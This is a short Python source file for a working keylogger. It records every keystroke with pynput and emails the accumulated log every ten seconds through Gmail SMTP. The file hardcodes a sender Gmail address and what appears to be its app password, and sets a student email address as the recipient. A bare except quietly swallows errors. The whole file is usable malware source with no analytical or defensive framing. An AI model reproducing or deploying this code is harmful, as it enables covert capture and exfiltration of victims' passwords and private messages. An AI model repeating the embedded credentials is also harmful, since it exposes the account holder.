import pynput.keyboard
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

log = "" 

def process_key_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " " 
        elif key == key.enter:
            log += "<Enter>\n" 
        elif key == key.backspace:
            log += "<BACKSPACE>" 
        elif key == key.tab:
            log += "<tab>"  
        else:
            log += " [" + str(key) + "] "

def send_email(email, password, message):
    try:
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = "22110336@student.hcmute.edu.vn"
        msg['Subject'] = "Keylogger Report"
        msg.attach(MIMEText(message, 'plain'))
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")

def report():
    global log
    if log.strip(): 
        send_email("huyphuocbinh204@gmail.com", "zbub fokl gftt erwr", log)
        log = "" 
    timer = threading.Timer(10, report)  
    timer.start()

try:
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
    with keyboard_listener:
        report() 
        keyboard_listener.join()
except:
    pass